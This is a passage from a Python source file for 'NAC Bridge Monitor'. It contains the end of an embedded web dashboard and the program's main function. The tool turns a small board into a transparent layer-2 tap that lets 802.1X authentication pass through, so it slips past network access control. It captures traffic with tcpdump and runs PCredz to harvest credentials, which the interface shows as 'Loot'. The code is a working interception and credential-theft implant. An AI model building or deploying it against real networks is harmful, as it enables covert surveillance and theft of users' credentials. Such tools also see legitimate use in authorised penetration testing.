<p>Bridge operates at Layer 2 only. Client 802.1X authentication passes through transparently. No stealth mode - bridge is always active for seamless operation.</p>
</div>
<div id="alert" class="alert"></div>
<div class="tab-nav">
<button class="tab-btn active" onclick="switchTab('status')">📊 Status</button>
<button class="tab-btn" onclick="switchTab('loot')">🎣 Loot <span id="lootBadge" class="badge">0</span></button>
</div>
<div id="statusTab" class="tab-content active">
<div class="status-header">
<h2>Capture Status</h2>
<div id="statusBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>
<div class="grid">
<div class="card">
<div class="card-title">Capture Size</div>
<div class="card-value" id="captureSize">0 MB</div>
<div class="card-detail" id="capturePackets">0 packets</div>
</div>
<div class="card">
<div class="card-title">Duration</div>
<div class="card-value" id="captureDuration">00:00:00</div>
<div class="card-detail" id="captureStartTime">Not started</div>
</div>
</div>
<div id="captureInfo" class="capture-info">
<h3>📦 Active Capture</h3>
<div class="capture-detail">
<span>File:</span>
<span id="captureFile" style="font-family:monospace">-</span>
</div>
<div class="capture-detail">
<span>Bridge:</span>
<span id="bridgeName">br0</span>
</div>
<div class="capture-detail">
<span>PID:</span>
<span id="capturePid">-</span>
</div>
</div>
<h2 style="margin-bottom:15px;color:#667eea">Network Topology</h2>
<div id="interfaces" class="interface-grid"></div>
<div class="button-group">
<button id="btnStart" class="btn btn-start">▶️ Start Capture</button>
<button id="btnStop" class="btn btn-stop" disabled>⏹️ Stop Capture</button>
<button id="btnPcapSize" class="btn btn-refresh" disabled>📊 PCAP Size: 0 MB</button>
<button id="btnDelete" class="btn btn-danger" disabled>🗑️ Delete PCAP</button>
<button id="btnRefresh" class="btn btn-refresh">🔄 Refresh</button>
<button id="btnDownload" class="btn btn-download" disabled>⬇️ Download PCAP</button>
</div>
<div class="logs-section">
<h3 style="color:#fff;margin-bottom:10px">📋 Recent Logs</h3>
<div id="logs"></div>
</div>
</div>
<div id="lootTab" class="tab-content">
<h2 style="margin-bottom:20px;color:#667eea">PCredz Analysis Output</h2>
<div class="button-group" style="margin-bottom:20px">
<button onclick="analyzeNow()" id="btnAnalyze" class="btn btn-start">🔍 Analyze PCAP Now</button>
<button onclick="exportLoot()" class="btn btn-download">⬇️ Export Output (TXT)</button>
<button onclick="clearLoot()" class="btn btn-danger">🗑️ Clear Output</button>
</div>
<div id="lootOutput" class="logs-section" style="max-height:600px;white-space:pre-wrap;word-wrap:break-word">
<div style="color:#999;text-align:center;padding:40px">
<div style="font-size:3em;margin-bottom:15px">🎣</div>
<p>No PCredz output yet</p>
<p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p>
</div>
</div>
</div>
</div>
</div>
<script>
let startTime=null,currentFilter='all',allLoot=[];
function showAlert(message,type="info"){const el=document.getElementById("alert");el.className=`alert alert-${type} show`;el.textContent=message;setTimeout(()=>el.classList.remove("show"),5000)}
function formatBytes(bytes){if(bytes===0)return"0 B";const k=1024,sizes=["B","KB","MB","GB"];const i=Math.floor(Math.log(bytes)/Math.log(k));return parseFloat((bytes/Math.pow(k,i)).toFixed(2))+" "+sizes[i]}
function formatDuration(seconds){const h=Math.floor(seconds/3600);const m=Math.floor(seconds%3600/60);const s=Math.floor(seconds%60);return`${h.toString().padStart(2,"0")}:${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`}
function switchTab(tab){document.querySelectorAll(".tab-content").forEach(el=>el.classList.remove("active"));document.querySelectorAll(".tab-btn").forEach(el=>el.classList.remove("active"));document.getElementById(tab+"Tab").classList.add("active");event.target.classList.add("active");if(tab==="loot")fetchLoot()}
function updateStatus(data){try{const isActive=data.status==="active";const badge=document.getElementById("statusBadge");if(badge){badge.className=`status-badge ${isActive?"active":"inactive"}`;badge.innerHTML=`<span class="status-indicator ${isActive?"active":"inactive"}"></span><span>${isActive?"Capturing":"Inactive"}</span>`}const captureInfo=document.getElementById("captureInfo");if(captureInfo){captureInfo.className=`capture-info ${isActive?"active":""}`}const size=data.pcap_size||0;const packets=data.packet_count||0;const pcapSizeBtn=document.getElementById("btnPcapSize");if(pcapSizeBtn){pcapSizeBtn.textContent=`📊 PCAP Size: ${formatBytes(size)}`;pcapSizeBtn.disabled=!data.pcap_file}if(isActive){const captureFile=document.getElementById("captureFile");if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";const capturePid=document.getElementById("capturePid");if(capturePid)capturePid.textContent=data.pid||"-";const bridgeName=document.getElementById("bridgeName");if(bridgeName)bridgeName.textContent=data.bridge||"br0";const captureSize=document.getElementById("captureSize");if(captureSize)captureSize.textContent=formatBytes(size);const capturePackets=document.getElementById("capturePackets");if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";if(data.start_time){if(!startTime)try{startTime=new Date(data.start_time)}catch(e){startTime=new Date}const elapsed=Math.floor((new Date()-startTime)/1000);const captureDuration=document.getElementById("captureDuration");if(captureDuration)captureDuration.textContent=formatDuration(elapsed);const captureStartTime=document.getElementById("captureStartTime");if(captureStartTime)captureStartTime.textContent="Started "+startTime.toLocaleTimeString()}const btnStart=document.getElementById("btnStart");if(btnStart)btnStart.disabled=true;const btnStop=document.getElementById("btnStop");if(btnStop)btnStop.disabled=false;const btnDelete=document.getElementById("btnDelete");if(btnDelete)btnDelete.disabled=true;const btnDownload=document.getElementById("btnDownload");if(btnDownload)btnDownload.disabled=false}else{const btnStart=document.getElementById("btnStart");if(btnStart)btnStart.disabled=false;const btnStop=document.getElementById("btnStop");if(btnStop)btnStop.disabled=true;const btnDelete=document.getElementById("btnDelete");if(btnDelete)btnDelete.disabled=!data.pcap_file;const btnDownload=document.getElementById("btnDownload");if(btnDownload)btnDownload.disabled=!data.pcap_file;startTime=null;const captureSize=document.getElementById("captureSize");if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";const capturePackets=document.getElementById("capturePackets");if(capturePackets)capturePackets.textContent="0 packets";const captureDuration=document.getElementById("captureDuration");if(captureDuration)captureDuration.textContent="00:00:00";const captureStartTime=document.getElementById("captureStartTime");if(captureStartTime)captureStartTime.textContent="Not started"}if(data.interfaces){const container=document.getElementById("interfaces");if(container){container.innerHTML=data.interfaces.map(intf=>`<div class="interface-card"><div class="interface-header"><span class="interface-name">${intf.name}</span><span class="interface-status ${intf.state==="UP"?"up":"down"}">${intf.state}</span></div><div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">${intf.mac||"N/A"}</span></div><div class="interface-detail"><span>Speed:</span><span>${intf.speed||"Unknown"}</span></div><div class="interface-detail"><span>Role:</span><span>${intf.role||"N/A"}</span></div>${intf.bridge?`<div class="interface-detail"><span>Bridge:</span><span>${intf.bridge}</span></div>`:""}</div>`).join("")}}if(data.logs&&data.logs.length>0){const logEl=document.getElementById("logs");if(logEl){logEl.innerHTML=data.logs.map(line=>`<div style="padding:2px 0">${line}</div>`).join("");logEl.scrollTop=logEl.scrollHeight}}}catch(err){console.error("Error updating status:",err)}}
async function analyzeNow(){const btnAnalyze=document.getElementById("btnAnalyze");if(btnAnalyze)btnAnalyze.disabled=true;showAlert("Running PCredz analysis... This may take a few minutes.","info");try{const res=await fetch("/api/analyze",{method:"POST"});const data=await res.json();if(data.success){showAlert("Analysis complete! Check output below.","success");fetchLoot()}else{showAlert("Analysis failed: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}finally{if(btnAnalyze)btnAnalyze.disabled=false}}
async function deletePCAP(){if(confirm("Delete current PCAP file? This cannot be undone!")){try{const res=await fetch("/api/delete_pcap",{method:"POST"});const data=await res.json();if(data.success){showAlert("PCAP deleted","success");fetchStatus();fetchLoot()}else{showAlert("Failed to delete PCAP: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
document.getElementById("btnDelete").addEventListener("click",deletePCAP);
async function fetchStatus(){try{const res=await fetch("/api/status");const data=await res.json();updateStatus(data)}catch(err){console.error("Failed to fetch status:",err);setTimeout(fetchStatus,5000)}}
async function fetchLoot(){try{const res=await fetch("/api/loot");const data=await res.json();const outputEl=document.getElementById("lootOutput");if(outputEl){if(data.has_output&&data.raw_output){outputEl.innerHTML=`<pre style="margin:0;color:#0f0;font-family:monospace;font-size:.9em">${escapeHtml(data.raw_output)}</pre>`;const badge=document.getElementById("lootBadge");if(badge)badge.textContent="✓"}else{outputEl.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">🎣</div><p>No PCredz output yet</p><p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p></div>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="0"}}}catch(err){console.error("Failed to fetch loot:",err)}}
function escapeHtml(text){const div=document.createElement('div');div.textContent=text;return div.innerHTML}
async function exportLoot(){try{const res=await fetch("/api/loot");const data=await res.json();if(data.has_output){window.location.href="/api/loot/export"}else{showAlert("No output to export yet","info")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearLoot(){if(confirm("Clear all captured credentials?")){try{const res=await fetch("/api/loot/clear",{method:"POST"});const data=await res.json();if(data.success){showAlert("Loot cleared","success");fetchLoot()}else{showAlert("Failed to clear loot","error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function startCapture(){document.getElementById("btnStart").disabled=true;showAlert("Starting packet capture...","info");try{const res=await fetch("/api/start",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture started!","success");setTimeout(fetchStatus,2000);setTimeout(fetchLoot,3000)}else{showAlert("Failed to start. Check logs.","error");document.getElementById("btnStart").disabled=false}}catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStart").disabled=false}}
async function stopCapture(){if(confirm("Stop capture? Bridge will remain active.")){document.getElementById("btnStop").disabled=true;showAlert("Stopping capture...","info");try{const res=await fetch("/api/stop",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture stopped!","success")}else{showAlert("Failed to stop","error")}setTimeout(fetchStatus,3000);setTimeout(fetchLoot,4000)}catch(err){showAlert("Error: "+err.message,"error")}}}
async function downloadPCAP(){try{const res=await fetch("/api/status");const data=await res.json();if(data.pcap_file){window.location.href="/api/download?file="+encodeURIComponent(data.pcap_file)}else{showAlert("No file","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
document.getElementById("btnStart").addEventListener("click",startCapture);
document.getElementById("btnStop").addEventListener("click",stopCapture);
document.getElementById("btnRefresh").addEventListener("click",()=>{fetchStatus();fetchLoot()});
document.getElementById("btnDownload").addEventListener("click",downloadPCAP);
fetchStatus();
setInterval(fetchStatus,2000);
setInterval(fetchLoot,5000);
</script>
</body>
</html>'''

# ============================================================================
# MAIN
# ============================================================================

def main():
    global shutdown_in_progress

    print("""
╔════════════════════════════════════════════════════════════╗
║       NAC Bridge Monitor - Transparent Tap Edition         ║
║              802.1X Compatible - Always Active             ║
╚════════════════════════════════════════════════════════════╝
""")

    if os.geteuid() != 0:
        print("❌ Must run as root: sudo python3 nac-monitor.py")
        return 1

    # Check dependencies
    missing = []
    for tool in ['tcpdump', 'ip', 'bridge', 'ethtool']:
        result = run_cmd(['which', tool])
        if not result or result.returncode != 0:
            missing.append(tool)

    if missing:
        print(f"❌ Missing tools: {', '.join(missing)}")
        print(f"   Install: sudo apt install {' '.join(missing)}")
        return 1

    if not os.path.exists(CONFIG['PCREDZ_PATH']):
        print("⚠️  PCredz not found - credential harvesting disabled")
        print("   Install: sudo bash install-nac-monitor.sh")
        print()

    os.makedirs(CONFIG['PCAP_DIR'], exist_ok=True)

    bridge_manager = BridgeManager()
    NACWebHandler.bridge_manager = bridge_manager

    log("NAC Bridge Monitor starting...")
    log("Mode: Transparent L2 tap (802.1X compatible)")

    # Setup bridge at startup (always active)
    if CONFIG['TRANSPARENT_MODE']:
        log("Transparent mode: Setting up bridge at startup...")
        if not bridge_manager.setup_transparent_bridge():
            log("Failed to setup bridge - continuing anyway", 'WARNING')

    # Signal handlers
    def signal_handler(signum, frame):
        global shutdown_in_progress
        if shutdown_in_progress:
            return
        shutdown_in_progress = True

        log("Shutdown signal received, cleaning up...")
        with capture_lock:
            if bridge_manager.tcpdump_process:
                bridge_manager.stop_capture()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Start web server
    server_address = ('', CONFIG['WEB_PORT'])
    httpd = HTTPServer(server_address, NACWebHandler)

    print(f"""
✅ Server started!

Web Interface:
  http://localhost:{CONFIG['WEB_PORT']}
  http://<nanopi-ip>:{CONFIG['WEB_PORT']}

Architecture:
  Client ←→ [eth0 ←→ br0 ←→ eth1] ←→ Switch
               └── tcpdump captures here

Features:
  🔄 Transparent Mode: Bridge always active (802.1X passes through)
  🎣 Manual Analysis: Click "Analyze PCAP Now" in Loot tab
  📊 IP Detection: Shows Client and Gateway IPs automatically
  🗑️  PCAP Management: Delete button to remove captures

Captures: {CONFIG['PCAP_DIR']}
Logs:     {CONFIG['LOGFILE']}
Loot:     {CONFIG['LOOT_FILE']}

Press Ctrl+C to stop
""")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        if not shutdown_in_progress:
            log("Shutting down...")
            with capture_lock:
                bridge_manager.stop_capture()
        httpd.shutdown()
        return 0

if __name__ == '__main__':
    sys.exit(main())
